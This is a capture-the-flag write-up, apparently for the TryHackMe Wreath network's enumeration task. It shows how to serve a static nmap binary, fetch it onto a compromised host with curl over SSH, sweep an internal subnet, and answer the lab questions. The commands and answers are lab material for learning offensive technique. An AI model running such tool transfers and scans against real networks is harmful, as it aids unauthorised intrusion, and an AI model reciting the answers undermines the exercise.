**Task 17: Enumeration**

This task is to check wether we learned anything from our previous tasks or not..

Lets begin with the setup, download the `static binary file`, and rename it to your user name such as `nmap-trial2222`

![Screenshot_2023-08-06_02_12_20](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/47a3fb7a-9c91-423a-a167-6e076b928af6)

After doing this lets move forward with the attack

First we will start the python server using the following command

    sudo python3 -m http.server 80

After switch to your pord server which have the access from the **task6** the command for that will be make sure to be in **root terminal**
 
    ssh 10.200.57.200 -i id_rsa 

Now type the curl command

      curl <your-ip>/nmap-trial2222 -o ./nmap-per

If you want the file to be stored then remove the /tmp/ from the command line cause the moment you switch of the pc /tmp files will get clear so there's a chance that you
might loose this file...

![Screenshot_2023-08-06_02_51_07](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/ffa2c93d-6557-469b-a452-9661d1ec6713)

make sure to give the file `chmod +x` perm to make it executable

Now lets scan and save the result, so that we can see them and answers the questions...

    ./nmap -sn 10.200.57.0/24 -oN scan-resul

-sn : switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.

-oN : store the output in normal form.

The output will be something like this..

![scanres](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/6d7e57b5-1bc1-440e-9263-cdebee21eb6f)

Lets move ahead and answer the questions...

**Q. Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?**

Ans: 2

**Q.In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**

Ans: 100,150

**Q. Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?**


![Screenshot_2023-08-06_03_20_46](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/3a10c8ae-9a40-4477-821e-aba3d870bd52)

So the answer should be 150


**Q. Let's assume that the other host is inaccessible from our current position in the network.
Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**

Ans: 80,3389,5985 in my case the ports were this your scan might get different results..

**Q.Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**

Ans: http
